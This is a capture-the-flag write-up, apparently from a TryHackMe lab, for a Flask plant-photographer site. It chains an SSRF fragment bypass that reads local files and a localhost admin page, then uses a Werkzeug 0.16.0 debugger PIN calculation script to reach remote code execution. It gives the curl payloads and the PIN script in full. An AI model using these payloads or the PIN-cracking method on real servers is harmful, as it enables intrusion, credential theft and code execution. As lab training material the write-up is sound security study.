# CTF Writeup: Plant Photographer (Hard)
(*solved using gemini-cli*)
## 1. Initial Reconnaissance
A network scan of the target IP reveals two open ports:
- **22 (SSH)**
- **80 (HTTP)**

The web application is a portfolio for "Jay Green," a plant photographer. It features a "Download Resume" button pointing to:
`http://10.48.145.105/download?server=secure-file-storage.com:8087&id=75482342`

This suggests that the server is making a backend request to a "secure-file-storage" server. The presence of a `server` parameter is an immediate indicator of a potential **Server-Side Request Forgery (SSRF)**.

---

## 2. Flag 1: Source Code Exfiltration
### The Discovery
To understand how the backend processes the `server` parameter, we tested for SSRF by pointing it to the local `/etc/passwd` file. However, the application uses `pycurl` and appends a directory path to the URL:
`crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)`

### The Bypass
We bypassed this by using a URL fragment (`#`), encoded as `%23`. This forces `pycurl` to ignore the appended path. We then used the `file://` protocol to read the application's source code.

**Request:**
```bash
curl -s "http://10.48.145.105/download?server=file:///usr/src/app/app.py%23&id=1"
```

### Analysis
The retrieved `app.py` contained the following configuration for the `pycurl` request:
```python
crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{Hello_Im_just_an_API_key}'])
```
This hardcoded header was intended to authenticate the server with its storage backend.

**Flag 1:** `THM{Hello_Im_just_an_API_key}`

---

## 3. Flag 2: Accessing the Admin PDF
### The Discovery
The source code revealed an `/admin` endpoint that only responds to `127.0.0.1` and serves a `flag.pdf`:
```python
@app.route("/admin")
def admin():
    if request.remote_addr == '127.0.0.1':
        return send_from_directory('private-docs', 'flag.pdf')
    return "Admin interface only available from localhost!!!"
```

### The Attack
We leveraged the SSRF bypass to make the server request its own `/admin` page locally (at `127.0.0.1:8087`, as seen in the `app.run` call).

**Request:**
```bash
curl -s "http://10.48.145.105/download?server=http://127.0.0.1:8087/admin%23&id=1" > flag.pdf
```

### Extraction
Since the response was a PDF, we used `pdftotext` to extract the flag:
```bash
pdftotext flag.pdf flag.txt && cat flag.txt
```

**Flag 2:** `thm{c4n_i_haz_flagz_plz?}`

---

## 4. Flag 3: Remote Code Execution (RCE)
### The Discovery
The application runs in `debug=True` mode, which exposes the Werkzeug debugger at `/console`. Accessing it requires a PIN.

### The Methodology: Breaking the Werkzeug PIN
To calculate the PIN, we need several system "bits." We exfiltrated them using the SSRF bypass:
1.  **User:** `root` (from `/etc/passwd`)
2.  **Module Name:** `flask.app`
3.  **App Name:** `Flask`
4.  **MAC Address (Converted to Decimal):** 
    We read `/sys/class/net/eth0/address` (`02:42:ac:14:00:02`). 
    `0x0242ac140002` (hex) = **2485378088962** (decimal).
5.  **Machine ID:** `77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca` (from `/proc/self/cgroup`)

### Exploiting Werkzeug 0.16.0
Crucially, this target uses **Werkzeug 0.16.0**. This affects the calculation in two ways:
-   It uses **MD5** hashing for the PIN (modern versions use SHA1).
-   It uses the **raw Cgroup ID** as the Machine ID without concatenation.

### The Debugger "SECRET"
When the debugger page loads, it includes a JavaScript variable: `SECRET = "eonBFtBMt72UFHeRLTlT"`. 
This is **not** the PIN. It is a session-specific token generated by Werkzeug to identify the debugger instance. To send commands to the console via `curl`, this secret must be provided as the `s` parameter in the URL.

### Dynamic Nature of the PIN
The PIN is derived from the "bits" mentioned above. Because the **MAC Address** and **Cgroup ID** are assigned by Docker when the container starts, the **PIN will change every time the container is recreated**. If the container is reset, you must re-run the SSRF to fetch the new bits and recalculate the PIN.

### The Calculation Script
The following Python script was used to generate the PIN for Werkzeug 0.16.0:

```python
import hashlib
from itertools import chain

def get_pin(public_bits, private_bits):
    h = hashlib.md5()
    for bit in chain(public_bits, private_bits):
        if not bit: continue
        if isinstance(bit, str): bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
    return '-'.join(num[x:x+3] for x in range(0, 9, 3))

public_bits = [
    'root', 
    'flask.app', 
    'Flask', 
    '/usr/local/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
    '2485378088962', 
    '77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'
]

print(get_pin(public_bits, private_bits))
```

**Calculated PIN:** `110-688-511`

### Gaining the Flag
After entering the PIN at `/console`, we executed Python commands to find and read the final flag:
```bash
# Executing through curl using the session SECRET (s=eonBFtBMt72UFHeRLTlT)
curl -s -b "cookie.txt" "http://10.48.145.105/console?__debugger__=yes&cmd=open('flag-982374827648721338.txt').read()&s=eonBFtBMt72UFHeRLTlT"
```

**Flag 3:** `THM{SSRF2RCE_2_1337_4_M3}`

---

## 5. Summary of Key Learnings
- **SSRF Bypass:** URL fragments (`#`) can be used to truncate unwanted strings appended by backend logic.
- **Debugger Sessions:** The `SECRET` value in the console source is a session token, distinct from the PIN, used to authenticate subsequent debugger requests.
- **Ephemeral PINs:** In containerized environments, the debugger PIN is dynamic and tied to the container's lifecycle.
